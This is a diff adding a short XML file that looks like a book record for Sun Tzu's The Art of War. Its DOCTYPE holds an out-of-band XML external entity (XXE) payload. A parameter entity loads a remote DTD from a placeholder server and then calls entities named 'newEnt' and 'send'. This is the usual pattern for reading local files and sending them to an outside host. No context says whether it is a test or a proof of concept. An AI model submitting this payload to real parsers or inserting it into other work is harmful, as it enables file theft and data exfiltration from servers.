@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE book [
+<!ENTITY % remote SYSTEM "http://serveraddress/file.dtd">
+%remote;
+%newEnt;
+%send;
+]>
+<book>
+  <name>The Art of War</name>
+  <author>Sun Tzu</author>
+  <price>370</price>
+</book>
